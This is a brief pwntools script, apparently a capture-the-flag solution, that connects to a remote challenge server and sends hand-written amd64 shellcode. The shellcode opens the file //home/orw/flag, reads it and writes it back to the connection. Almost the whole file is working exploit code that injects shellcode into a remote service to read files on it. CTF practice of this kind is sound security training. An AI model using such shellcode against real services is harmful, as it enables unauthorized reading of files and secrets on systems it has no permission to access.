from pwn import *

context.arch = 'amd64'
r = remote("csie.ctf.tw",10124)
a = r.recv()
#//home/orw/flag
#2F 2F 68 6F 6D 65 2F 6F 72 77 2F 66 6C 61 67 00
a = asm("""
        push 0
        mov rdi, 0x0067616C662F7772
	push rdi
	mov rdi, 0x6F2F656D6F682F2F
	push rdi
	mov rdi, rsp
	mov rsi, 0
	mov rdx, 0
	mov rax, 2
	syscall

	mov rdi, rax
	mov rsi, rsp
	mov rdx, 0x100
	mov rax, 0
	syscall

	mov rdi, 1
	mov rax, 1
	syscall
	""")

r.send(a)
a = r.recvline()
print(a)
